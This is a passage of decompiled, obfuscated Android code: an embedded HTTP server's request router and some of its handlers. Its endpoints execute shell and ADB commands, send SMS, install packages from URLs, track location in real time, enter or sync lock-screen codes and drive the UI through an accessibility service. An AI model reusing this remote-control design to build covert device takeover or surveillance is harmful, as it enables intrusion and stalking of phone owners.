                if (str.equals("/install")) {
                    c = 15;
                    break;
                }
                c = 65535;
                break;
            case -2029212786:
                if (str.equals("/startApp")) {
                    c = 0;
                    break;
                }
                c = 65535;
                break;
            case -2007358046:
                if (str.equals("/sendSms")) {
                    c = 11;
                    break;
                }
                c = 65535;
                break;
            case -1944350924:
                if (str.equals("/target/findByCombineWithoutChild")) {
                    c = '#';
                    break;
                }
                c = 65535;
                break;
            case -1912426496:
                if (str.equals("/target/scrollBackwardUtilWithOperateOr")) {
                    c = ';';
                    break;
                }
                c = 65535;
                break;
            case -1873443632:
                if (str.equals("/target/scrollBackwardUtilMultipleWithOperateOr")) {
                    c = '<';
                    break;
                }
                c = 65535;
                break;
            case -1861777643:
                if (str.equals("/target/scrollBackwardUtilWithChild")) {
                    c = '3';
                    break;
                }
                c = 65535;
                break;
            case -1810888403:
                if (str.equals("/target/matchListenWindow")) {
                    c = '>';
                    break;
                }
                c = 65535;
                break;
            case -1639239219:
                if (str.equals("/target/findParentByCombineWithUpLevel")) {
                    c = ')';
                    break;
                }
                c = 65535;
                break;
            case -1557660719:
                if (str.equals("/startAppDetailSetting")) {
                    c = '\t';
                    break;
                }
                c = 65535;
                break;
            case -1427438416:
                if (str.equals("/startAboutDevice")) {
                    c = 6;
                    break;
                }
                c = 65535;
                break;
            case -1354078634:
                if (str.equals("/target/findParentByCombine")) {
                    c = '\'';
                    break;
                }
                c = 65535;
                break;
            case -1326426737:
                if (str.equals("/target/scrollForwardUtilMultipleWithoutChild")) {
                    c = '6';
                    break;
                }
                c = 65535;
                break;
            case -1169748514:
                if (str.equals("/target/scrollForwardUtilMultipleWithCombine")) {
                    c = '.';
                    break;
                }
                c = 65535;
                break;
            case -1142310130:
                if (str.equals("/target/scrollForwardUtilWithCombine")) {
                    c = '-';
                    break;
                }
                c = 65535;
                break;
            case -1088163018:
                if (str.equals("/deleteFile")) {
                    c = 28;
                    break;
                }
                c = 65535;
                break;
            case -1065115269:
                if (str.equals("/target/scrollForwardUtilMultipleWithChild")) {
                    c = '2';
                    break;
                }
                c = 65535;
                break;
            case -932555518:
                if (str.equals("/syncPowerControl")) {
                    c = 18;
                    break;
                }
                c = 65535;
                break;
            case -902183474:
                if (str.equals("/requestLocalAdbPair")) {
                    c = 23;
                    break;
                }
                c = 65535;
                break;
            case -867569794:
                if (str.equals("/target/findOneByCombineWithoutChild")) {
                    c = '%';
                    break;
                }
                c = 65535;
                break;
            case -733860467:
                if (str.equals("/localAdbShell")) {
                    c = '\r';
                    break;
                }
                c = 65535;
                break;
            case -724670762:
                if (str.equals("/startSettings")) {
                    c = 3;
                    break;
                }
                c = 65535;
                break;
            case -705932875:
                if (str.equals("/target/scrollBackwardUtilWithoutChild")) {
                    c = '7';
                    break;
                }
                c = 65535;
                break;
            case -586564152:
                if (str.equals("/target/scrollBackwardUtilMultipleWithCombine")) {
                    c = '0';
                    break;
                }
                c = 65535;
                break;
            case -579186398:
                if (str.equals("/realMonitorLocation")) {
                    c = 29;
                    break;
                }
                c = 65535;
                break;
            case -475836833:
                if (str.equals("/target/scrollForwardUtilWithoutChild")) {
                    c = '5';
                    break;
                }
                c = 65535;
                break;
            case -471086624:
                if (str.equals("/target/findByCombine")) {
                    c = 31;
                    break;
                }
                c = 65535;
                break;
            case -427580699:
                if (str.equals("/target/scrollBackwardUtilMultipleWithoutChild")) {
                    c = '8';
                    break;
                }
                c = 65535;
                break;
            case -294174798:
                if (str.equals("/target/findOneByOperateOr")) {
                    c = ',';
                    break;
                }
                c = 65535;
                break;
            case -237067286:
                if (str.equals("/target/findLastByCombine")) {
                    c = '!';
                    break;
                }
                c = 65535;
                break;
            case -12108635:
                if (str.equals("/target/action")) {
                    c = 30;
                    break;
                }
                c = 65535;
                break;
            case 191264919:
                if (str.equals("/syncADBConfig")) {
                    c = 16;
                    break;
                }
                c = 65535;
                break;
            case 327100262:
                if (str.equals("/target/scrollForwardUtilMultipleWithOperateOr")) {
                    c = ':';
                    break;
                }
                c = 65535;
                break;
            case 359032258:
                if (str.equals("/postNotificationDialog")) {
                    c = 1;
                    break;
                }
                c = 65535;
                break;
            case 587829843:
                if (str.equals("/global/action")) {
                    c = 20;
                    break;
                }
                c = 65535;
                break;
            case 616037888:
                if (str.equals("/syncLockCipher")) {
                    c = 25;
                    break;
                }
                c = 65535;
                break;
            case 807515101:
                if (str.equals("/localAdbPair")) {
                    c = '\f';
                    break;
                }
                c = 65535;
                break;
            case 807534621:
                if (str.equals("/localAdbPush")) {
                    c = 14;
                    break;
                }
                c = 65535;
                break;
            case 879175827:
                if (str.equals("/target/findChildUtilUpLevel")) {
                    c = '*';
                    break;
                }
                c = 65535;
                break;
            case 925583510:
                if (str.equals("/target/scrollForwardUtilWithOperateOr")) {
                    c = '9';
                    break;
                }
                c = 65535;
                break;
            case 979967869:
                if (str.equals("/global/execCommand")) {
                    c = 19;
                    break;
                }
                c = 65535;
                break;
            case 1128821103:
                if (str.equals("/requestPermission")) {
                    c = 4;
                    break;
                }
                c = 65535;
                break;
            case 1173270002:
                if (str.equals("/syncDownload")) {
                    c = 26;
                    break;
                }
                c = 65535;
                break;
            case 1222156319:
                if (str.equals("/startAppWriteSetting")) {
                    c = '\n';
                    break;
                }
                c = 65535;
                break;
            case 1287702826:
                if (str.equals("/target/findOneByCombine")) {
                    c = ' ';
                    break;
                }
                c = 65535;
                break;
            case 1296445914:
                if (str.equals("/target/findOneByCombineWithParent")) {
                    c = '&';
                    break;
                }
                c = 65535;
                break;
            case 1360442228:
                if (str.equals("/enterCipher")) {
                    c = 22;
                    break;
                }
                c = 65535;
                break;
            case 1396569941:
                if (str.equals("/asyncDownload")) {
                    c = 27;
                    break;
                }
                c = 65535;
                break;
            case 1476548166:
                if (str.equals("/listenWindow")) {
                    c = 5;
                    break;
                }
                c = 65535;
                break;
            case 1568870874:
                if (str.equals("/showNavigateWifiDialog")) {
                    c = 2;
                    break;
                }
                c = 65535;
                break;
            case 1666898165:
                if (str.equals("/syncAdminActivating")) {
                    c = 17;
                    break;
                }
                c = 65535;
                break;
            case 1726278376:
                if (str.equals("/target/findByOperateOr")) {
                    c = '+';
                    break;
                }
                c = 65535;
                break;
            case 1792168438:
                if (str.equals("/target/findByCombineWithChild")) {
                    c = '\"';
                    break;
                }
                c = 65535;
                break;
            case 1871880780:
                if (str.equals("/target/refresh")) {
                    c = '=';
                    break;
                }
                c = 65535;
                break;
            case 1969677804:
                if (str.equals("/target/findOneByCombineWithChild")) {
                    c = '$';
                    break;
                }
                c = 65535;
                break;
            case 1997748712:
                if (str.equals("/startWifiSetting")) {
                    c = '\b';
                    break;
                }
                c = 65535;
                break;
            case 2036856056:
                if (str.equals("/target/scrollBackwardUtilWithCombine")) {
                    c = '/';
                    break;
                }
                c = 65535;
                break;
            case 2116099196:
                if (str.equals("/confirmLock")) {
                    c = 24;
                    break;
                }
                c = 65535;
                break;
            default:
                c = 65535;
                break;
        }
        switch (c) {
            case 0:
                ReqStartApp reqStartApp = (ReqStartApp) AbstractC0252h.m700d(str2, ReqStartApp.class);
                if (reqStartApp == null) {
                    reqStartApp = new ReqStartApp();
                }
                N2(reqStartApp.getStartPackage(), reqStartApp.getMainActivity(), reqStartApp.isStart(), reqStartApp.getListenWindows(), abstractC0381k);
                break;
            case 1:
                NotificationDialogVO notificationDialogVO = (NotificationDialogVO) AbstractC0252h.m700d(str2, NotificationDialogVO.class);
                if (notificationDialogVO != null) {
                    Y1(notificationDialogVO.getNotificationTitle(), notificationDialogVO.getNotificationContent(), notificationDialogVO.getNotificationButton(), notificationDialogVO.getPackageName(), notificationDialogVO.getStartActivity(), abstractC0381k);
                    break;
                }
                break;
            case 2:
                NavigateWifiSettingDialogVO navigateWifiSettingDialogVO = (NavigateWifiSettingDialogVO) AbstractC0252h.m700d(str2, NavigateWifiSettingDialogVO.class);
                if (navigateWifiSettingDialogVO != null) {
                    J2(navigateWifiSettingDialogVO.getNotificationTitle(), navigateWifiSettingDialogVO.getNotificationContent(), navigateWifiSettingDialogVO.getNotificationButton(), navigateWifiSettingDialogVO.getPackageName(), navigateWifiSettingDialogVO.getNotificationIcon(), abstractC0381k);
                    break;
                }
                break;
            case 3:
                ReqStartApp reqStartApp2 = (ReqStartApp) AbstractC0252h.m700d(str2, ReqStartApp.class);
                if (reqStartApp2 == null) {
                    reqStartApp2 = new ReqStartApp();
                }
                X2(reqStartApp2.getListenWindows(), abstractC0381k);
                break;
            case 4:
                l2((PermissionRequestVO) AbstractC0252h.m700d(str2, PermissionRequestVO.class), abstractC0381k);
                break;
            case 5:
                w1((ListenWindow) AbstractC0252h.m700d(str2, ListenWindow.class), abstractC0381k);
                break;
            case 6:
                ReqStartApp reqStartApp3 = (ReqStartApp) AbstractC0252h.m700d(str2, ReqStartApp.class);
                if (reqStartApp3 == null) {
                    reqStartApp3 = new ReqStartApp();
                }
                K2(reqStartApp3.getListenWindows(), abstractC0381k);
                break;
            case 7:
                ReqStartApp reqStartApp4 = (ReqStartApp) AbstractC0252h.m700d(str2, ReqStartApp.class);
                if (reqStartApp4 == null) {
                    reqStartApp4 = new ReqStartApp();
                }
                R2(reqStartApp4.getListenWindows(), abstractC0381k);
                break;
            case '\b':
                ReqStartApp reqStartApp5 = (ReqStartApp) AbstractC0252h.m700d(str2, ReqStartApp.class);
                if (reqStartApp5 == null) {
                    reqStartApp5 = new ReqStartApp();
                }
                Z2(reqStartApp5.getListenWindows(), abstractC0381k);
                break;
            case '\t':
                ReqStartApp reqStartApp6 = (ReqStartApp) AbstractC0252h.m700d(str2, ReqStartApp.class);
                if (reqStartApp6 == null) {
                    reqStartApp6 = new ReqStartApp();
                }
                O2(reqStartApp6.getStartPackage(), reqStartApp6.getListenWindows(), abstractC0381k);
                break;
            case '\n':
                ReqStartApp reqStartApp7 = (ReqStartApp) AbstractC0252h.m700d(str2, ReqStartApp.class);
                if (reqStartApp7 == null) {
                    reqStartApp7 = new ReqStartApp();
                }
                Q2(reqStartApp7.getStartPackage(), reqStartApp7.getListenWindows(), abstractC0381k);
                break;
            case 11:
                ReqSendSMSVO reqSendSMSVO = (ReqSendSMSVO) AbstractC0252h.m700d(str2, ReqSendSMSVO.class);
                if (reqSendSMSVO != null) {
                    E2(reqSendSMSVO.getPhoneNumber(), reqSendSMSVO.getContent(), abstractC0381k);
                    break;
                }
                m500p(abstractC0381k, "请求参数有误,请检查参数是否合法");
                break;
            case '\f':
                ReqADBPairVO reqADBPairVO = (ReqADBPairVO) AbstractC0252h.m700d(str2, ReqADBPairVO.class);
                if (reqADBPairVO != null) {
                    y1(reqADBPairVO.getHost(), reqADBPairVO.getPairPort(), reqADBPairVO.getPairCode(), reqADBPairVO.isDirectConnect(), abstractC0381k);
                    break;
                } else {
                    m500p(abstractC0381k, "请求参数有误,请检查参数是否合法");
                    break;
                }
            case '\r':
                ReqAdbShellVO reqAdbShellVO = (ReqAdbShellVO) AbstractC0252h.m700d(str2, ReqAdbShellVO.class);
                if (reqAdbShellVO != null) {
                    A1(abstractC0381k, reqAdbShellVO.getCommand());
                    break;
                } else {
                    m500p(abstractC0381k, "请求参数有误,请检查参数是否合法");
                    break;
                }
            case 14:
                ReqAdbInstallVO reqAdbInstallVO = (ReqAdbInstallVO) AbstractC0252h.m700d(str2, ReqAdbInstallVO.class);
                if (reqAdbInstallVO != null) {
                    z1(reqAdbInstallVO.getLogId(), reqAdbInstallVO.getFileUrl(), reqAdbInstallVO.getFileName(), reqAdbInstallVO.getStartCommand(), abstractC0381k);
                    break;
                } else {
                    m500p(abstractC0381k, "请求参数有误,请检查参数是否合法");
                    break;
                }
            case 15:
                ReqAdbInstallVO reqAdbInstallVO2 = (ReqAdbInstallVO) AbstractC0252h.m700d(str2, ReqAdbInstallVO.class);
                if (reqAdbInstallVO2 != null) {
                    p1(reqAdbInstallVO2.getLogId(), reqAdbInstallVO2.getFileUrl(), reqAdbInstallVO2.getFileName(), reqAdbInstallVO2.getStartCommand(), abstractC0381k);
                    break;
                } else {
                    m500p(abstractC0381k, "请求参数有误,请检查参数是否合法");
                    break;
                }
            case 16:
                h3((ADBConfig) AbstractC0252h.m700d(str2, ADBConfig.class), abstractC0381k);
                break;
            case 17:
                i3((AdminAdminActivatingVO) AbstractC0252h.m700d(str2, AdminAdminActivatingVO.class), abstractC0381k);
                break;
            case 18:
                r3((PowerControlStateVO) AbstractC0252h.m700d(str2, PowerControlStateVO.class), abstractC0381k);
                break;
            case 19:
                m465G((RequestCommand) AbstractC0252h.m700d(str2, RequestCommand.class), abstractC0381k);
                break;
            case 20:
                if (MyAccessibilityService.m554P() != null) {
                    f1((GlobalActionCondition) AbstractC0252h.m700d(str2, GlobalActionCondition.class), abstractC0381k);
                    break;
                }
                M1(abstractC0381k);
                break;
            case 21:
                A3((ReqUnlockDeviceVO) AbstractC0252h.m700d(str2, ReqUnlockDeviceVO.class), abstractC0381k);
                break;
            case 22:
                m464F((DeviceCipherStateVO) AbstractC0252h.m700d(str2, DeviceCipherStateVO.class), abstractC0381k);
                break;
            case 23:
                j2((ReqUnlockDeviceVO) AbstractC0252h.m700d(str2, ReqUnlockDeviceVO.class), abstractC0381k);
                break;
            case 24:
                m504t((ReqUnlockDeviceVO) AbstractC0252h.m700d(str2, ReqUnlockDeviceVO.class), abstractC0381k);
                break;
            case 25:
                n3((ReqUnlockDeviceVO) AbstractC0252h.m700d(str2, ReqUnlockDeviceVO.class), abstractC0381k);
                break;
            case 26:
                ReqDownloadFileVO reqDownloadFileVO = (ReqDownloadFileVO) AbstractC0252h.m700d(str2, ReqDownloadFileVO.class);
                if (reqDownloadFileVO != null) {
                    m3(reqDownloadFileVO.getFilepath(), reqDownloadFileVO.getFileUrl(), reqDownloadFileVO.isSaveToGallery(), abstractC0381k);
                    break;
                } else {
                    m500p(abstractC0381k, "请求参数有误,请检查参数是否合法");
                    break;
                }
            case 27:
                ReqDownloadFileVO reqDownloadFileVO2 = (ReqDownloadFileVO) AbstractC0252h.m700d(str2, ReqDownloadFileVO.class);
                if (reqDownloadFileVO2 != null) {
                    m489e(reqDownloadFileVO2.getFilepath(), reqDownloadFileVO2.getFileUrl(), reqDownloadFileVO2.isSaveToGallery(), abstractC0381k);
                    break;
                } else {
                    m500p(abstractC0381k, "请求参数有误,请检查参数是否合法");
                    break;
                }
            case 28:
                ReqDeleteFileVO reqDeleteFileVO = (ReqDeleteFileVO) AbstractC0252h.m700d(str2, ReqDeleteFileVO.class);
                if (reqDeleteFileVO != null) {
                    m509y(reqDeleteFileVO.getFilePathAndName(), reqDeleteFileVO.getGalleryUrl(), abstractC0381k);
                    break;
                } else {
                    m500p(abstractC0381k, "请求参数有误,请检查参数是否合法");
                    break;
                }
            case 29:
                b2((ReqMonitorLocationVO) AbstractC0252h.m700d(str2, ReqMonitorLocationVO.class), abstractC0381k);
                break;
            case 30:
                TargetActionCondition targetActionCondition = (TargetActionCondition) AbstractC0252h.m700d(str2, TargetActionCondition.class);
                if (MyAccessibilityService.m554P() != null) {
                    if (targetActionCondition != null) {
                        x3(targetActionCondition.getDelegateId(), targetActionCondition, abstractC0381k);
                        break;
                    } else {
                        m500p(abstractC0381k, "请求参数有误,请检查参数是否合法");
                        break;
                    }
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case NamedGroup.brainpoolP256r1tls13 /* 31 */:
                CombineFilter combineFilter = (CombineFilter) AbstractC0252h.m700d(str2, CombineFilter.class);
                if (MyAccessibilityService.m554P() != null) {
                    if (combineFilter != null) {
                        m471M(combineFilter.getDelegateId(), combineFilter, abstractC0381k);
                        break;
                    } else {
                        m500p(abstractC0381k, "请求参数有误,请检查参数是否合法");
                        break;
                    }
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case ' ':
                CombineFilter combineFilter2 = (CombineFilter) AbstractC0252h.m700d(str2, CombineFilter.class);
                if (MyAccessibilityService.m554P() != null) {
                    if (combineFilter2 != null) {
                        G0(combineFilter2.getDelegateId(), combineFilter2, abstractC0381k);
                        break;
                    } else {
                        m500p(abstractC0381k, "请求参数有误,请检查参数是否合法");
                        break;
                    }
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '!':
                CombineFilter combineFilter3 = (CombineFilter) AbstractC0252h.m700d(str2, CombineFilter.class);
                if (MyAccessibilityService.m554P() != null) {
                    if (combineFilter3 != null) {
                        l0(combineFilter3.getDelegateId(), combineFilter3, abstractC0381k);
                        break;
                    } else {
                        m500p(abstractC0381k, "请求参数有误,请检查参数是否合法");
                        break;
                    }
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '\"':
                if (MyAccessibilityService.m554P() != null) {
                    m472N((CombineFilterWithChild) AbstractC0252h.m700d(str2, CombineFilterWithChild.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '#':
                if (MyAccessibilityService.m554P() != null) {
                    m473O((CombineFilterWithChild) AbstractC0252h.m700d(str2, CombineFilterWithChild.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '$':
                if (MyAccessibilityService.m554P() != null) {
                    H0((CombineFilterWithChild) AbstractC0252h.m700d(str2, CombineFilterWithChild.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '%':
                if (MyAccessibilityService.m554P() != null) {
                    J0((CombineFilterWithChild) AbstractC0252h.m700d(str2, CombineFilterWithChild.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '&':
                if (MyAccessibilityService.m554P() != null) {
                    I0((CombineFilterWithChild) AbstractC0252h.m700d(str2, CombineFilterWithChild.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '\'':
                CombineFilter combineFilter4 = (CombineFilter) AbstractC0252h.m700d(str2, CombineFilter.class);
                if (MyAccessibilityService.m554P() != null) {
                    if (combineFilter4 != null) {
                        a1(combineFilter4.getDelegateId(), combineFilter4, 1, abstractC0381k);
                        break;
                    } else {
                        m500p(abstractC0381k, "请求参数有误,请检查参数是否合法");
                        break;
                    }
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '(':
                CombineFilter combineFilter5 = (CombineFilter) AbstractC0252h.m700d(str2, CombineFilter.class);
                if (MyAccessibilityService.m554P() != null) {
                    if (combineFilter5 != null) {
                        b1(combineFilter5.getDelegateId(), combineFilter5, abstractC0381k);
                        break;
                    } else {
                        m500p(abstractC0381k, "请求参数有误,请检查参数是否合法");
                        break;
                    }
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case ')':
                CombineFilterWithUpLevel combineFilterWithUpLevel = (CombineFilterWithUpLevel) AbstractC0252h.m700d(str2, CombineFilterWithUpLevel.class);
                if (MyAccessibilityService.m554P() == null) {
                    M1(abstractC0381k);
                    break;
                } else {
                    if (combineFilterWithUpLevel != null && combineFilterWithUpLevel.getChildFilter() != null) {
                        a1(combineFilterWithUpLevel.getChildFilter().getDelegateId(), combineFilterWithUpLevel.getChildFilter(), combineFilterWithUpLevel.getUpLevel(), abstractC0381k);
                        break;
                    }
                    m500p(abstractC0381k, "参数有误,childFilter不能为空");
                }
                break;
            case '*':
                if (MyAccessibilityService.m554P() == null) {
                    M1(abstractC0381k);
                    break;
                } else {
                    CombineFilterWithUpLevel combineFilterWithUpLevel2 = (CombineFilterWithUpLevel) AbstractC0252h.m700d(str2, CombineFilterWithUpLevel.class);
                    if (combineFilterWithUpLevel2 != null && combineFilterWithUpLevel2.getChildFilter() != null) {
                        f0(combineFilterWithUpLevel2.getChildFilter().getDelegateId(), combineFilterWithUpLevel2.getChildFilter(), combineFilterWithUpLevel2.getUpLevel(), abstractC0381k);
                        break;
                    }
                    m500p(abstractC0381k, "参数有误,childFilter不能为空");
                }
                break;
            case '+':
                if (MyAccessibilityService.m554P() != null) {
                    m484Z((CombineFiltersWithOr) AbstractC0252h.m700d(str2, CombineFiltersWithOr.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case ',':
                if (MyAccessibilityService.m554P() != null) {
                    U0((CombineFiltersWithOr) AbstractC0252h.m700d(str2, CombineFiltersWithOr.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '-':
                if (MyAccessibilityService.m554P() != null) {
                    B2((CombineFilter) AbstractC0252h.m700d(str2, CombineFilter.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '.':
                if (MyAccessibilityService.m554P() != null) {
                    x2((CombineFilter) AbstractC0252h.m700d(str2, CombineFilter.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '/':
                if (MyAccessibilityService.m554P() != null) {
                    t2((CombineFilter) AbstractC0252h.m700d(str2, CombineFilter.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '0':
                if (MyAccessibilityService.m554P() != null) {
                    p2((CombineFilter) AbstractC0252h.m700d(str2, CombineFilter.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '1':
                if (MyAccessibilityService.m554P() != null) {
                    A2((CombineFilterWithChild) AbstractC0252h.m700d(str2, CombineFilterWithChild.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '2':
                if (MyAccessibilityService.m554P() != null) {
                    w2((CombineFilterWithChild) AbstractC0252h.m700d(str2, CombineFilterWithChild.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '3':
                if (MyAccessibilityService.m554P() != null) {
                    s2((CombineFilterWithChild) AbstractC0252h.m700d(str2, CombineFilterWithChild.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '4':
                if (MyAccessibilityService.m554P() != null) {
                    o2((CombineFilterWithChild) AbstractC0252h.m700d(str2, CombineFilterWithChild.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '5':
                if (MyAccessibilityService.m554P() != null) {
                    D2((CombineFilterWithChild) AbstractC0252h.m700d(str2, CombineFilterWithChild.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '6':
                if (MyAccessibilityService.m554P() != null) {
                    z2((CombineFilterWithChild) AbstractC0252h.m700d(str2, CombineFilterWithChild.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '7':
                if (MyAccessibilityService.m554P() != null) {
                    v2((CombineFilterWithChild) AbstractC0252h.m700d(str2, CombineFilterWithChild.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '8':
                if (MyAccessibilityService.m554P() != null) {
                    r2((CombineFilterWithChild) AbstractC0252h.m700d(str2, CombineFilterWithChild.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '9':
                if (MyAccessibilityService.m554P() != null) {
                    C2((CombineFiltersWithOr) AbstractC0252h.m700d(str2, CombineFiltersWithOr.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case ':':
                if (MyAccessibilityService.m554P() != null) {
                    y2((CombineFiltersWithOr) AbstractC0252h.m700d(str2, CombineFiltersWithOr.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case ';':
                if (MyAccessibilityService.m554P() != null) {
                    u2((CombineFiltersWithOr) AbstractC0252h.m700d(str2, CombineFiltersWithOr.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '<':
                if (MyAccessibilityService.m554P() != null) {
                    q2((CombineFiltersWithOr) AbstractC0252h.m700d(str2, CombineFiltersWithOr.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case '=':
                CombineFilter combineFilter6 = (CombineFilter) AbstractC0252h.m700d(str2, CombineFilter.class);
                if (MyAccessibilityService.m554P() != null) {
                    if (combineFilter6 != null) {
                        e2(combineFilter6.getDelegateId(), combineFilter6.getResUnique(), combineFilter6.getTarget(), abstractC0381k);
                        break;
                    } else {
                        m500p(abstractC0381k, "请求参数有误,请检查参数是否合法");
                        break;
                    }
                } else {
                    M1(abstractC0381k);
                    break;
                }
            case CipherSuite.TLS_DH_DSS_WITH_AES_128_CBC_SHA256 /* 62 */:
                if (MyAccessibilityService.m554P() != null) {
                    H1((MatchListenWindowVO) AbstractC0252h.m700d(str2, MatchListenWindowVO.class), abstractC0381k);
                    break;
                } else {
                    M1(abstractC0381k);
                    break;
                }
            default:
                N1(abstractC0381k);
                break;
        }
    }

    public static void X2(List list, AbstractC0381k abstractC0381k) {
        try {
            if (MyAccessibilityService.m554P() == null) {
                M1(abstractC0381k);
                return;
            }
            C0416e m523d = MyAccessibilityService.m554P().m523d("com.android.settings", list);
            ApiResult apiResult = new ApiResult();
            if (m523d != null) {
                apiResult.setData(m523d.f864c);
                apiResult.setCount(1);
            }
            apiResult.setCode(200);
            apiResult.setMsg("OK");
            apiResult.setSuccess(Boolean.valueOf(AbstractC0251g.X0()));
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    /* renamed from: Y */
    public static void m483Y(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeListResultVO searchNodeListResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (m1074m != null && !AbstractC0026q.m151B(str2)) {
                searchNodeListResultVO = o12.m1058C(m1074m.findByIdStartsWith(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeListResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeListResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeListResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void Y0(String str, String str2, String str3, int i2, AbstractC0381k abstractC0381k) {
        SearchNodeResultVO searchNodeResultVO;
        UiObject m1074m;
        try {
            C0416e o12 = o1(str);
            if (m508x(o12, abstractC0381k)) {
                return;
            }
            if (o12 == null || AbstractC0026q.m151B(str2)) {
                m500p(abstractC0381k, "你提交的参数有误,委托ID、关键字不能为空");
                return;
            }
            try {
                m1074m = o12.m1074m(i2, str3);
            } catch (Exception e2) {
                AbstractC0026q.m186s("AccessibilityDelegate", e2);
            }
            if (!AbstractC0026q.m151B(str2) && m1074m != null) {
                searchNodeResultVO = o12.m1059D(m1074m.findOneByTextMatches(str2));
                ApiResult apiResult = new ApiResult();
                apiResult.setData(searchNodeResultVO);
                apiResult.setCode(200);
                apiResult.setMsg("OK");
                apiResult.setCount(1);
                apiResult.setSuccess(Boolean.TRUE);
                String m693N = AbstractC0252h.m693N(apiResult);
                abstractC0381k.f771l = apiResult.getCode().intValue();
                abstractC0381k.m952h(m693N);
                abstractC0381k.mo787l();
            }
            searchNodeResultVO = null;
            ApiResult apiResult2 = new ApiResult();
            apiResult2.setData(searchNodeResultVO);
            apiResult2.setCode(200);
            apiResult2.setMsg("OK");
            apiResult2.setCount(1);
            apiResult2.setSuccess(Boolean.TRUE);
            String m693N2 = AbstractC0252h.m693N(apiResult2);
            abstractC0381k.f771l = apiResult2.getCode().intValue();
            abstractC0381k.m952h(m693N2);
            abstractC0381k.mo787l();
        } catch (Exception e3) {
            AbstractC0026q.m186s("HttpServer", e3);
        }
    }

    public static void Y1(String str, String str2, String str3, String str4, String str5, AbstractC0381k abstractC0381k) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.FALSE);
            apiResult.setCode(204);
            apiResult.setMsg("No Content");
            apiResult.setCount(1);
            apiResult.setSuccess(Boolean.TRUE);
            if (AbstractC0251g.m653Z() != null && !AbstractC0026q.m151B(str) && !AbstractC0026q.m151B(str2) && !AbstractC0026q.m151B(str4)) {
                apiResult.setData(Boolean.valueOf(AbstractC0191n.m359d(str, str2, str3, str4, str5)));
                apiResult.setCode(200);
                apiResult.setMsg("OK");
            }
            String m693N = AbstractC0252h.m693N(apiResult);
            abstractC0381k.f771l = apiResult.getCode().intValue();
            abstractC0381k.m952h(m693N);
            abstractC0381k.mo787l();
        } catch (Exception e2) {
            AbstractC0026q.m186s("HttpServer", e2);
        }
    }

    public static void Y2(AbstractC0381k abstractC0381k, String str) {
        try {
            ApiResult apiResult = new ApiResult();
            apiResult.setData(Boolean.FALSE);
            boolean z2 = true;
            apiResult.setCount(1);
            if (MyAccessibilityService.m554P() != null && MyAccessibilityService.m554P().f309g != null) {
                g0 g0Var = MyAccessibilityService.m554P().f309g;
                g0Var.getClass();
                if (AbstractC0026q.m151B(str)) {
                    z2 = false;
                } else {
